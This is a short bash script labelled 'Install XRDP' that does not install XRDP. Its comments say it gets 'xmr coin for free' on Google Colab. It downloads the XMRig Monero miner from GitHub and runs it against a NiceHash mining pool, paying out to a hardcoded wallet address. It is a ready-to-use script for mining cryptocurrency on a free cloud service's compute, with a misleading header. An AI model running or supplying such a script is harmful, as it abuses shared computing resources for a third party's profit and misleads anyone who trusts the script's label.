#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 3JAjhFSGD1Jr5mjumCCbr32KmD8rp3Ctg8.go9 -p x -k --nicehash -a rx/0
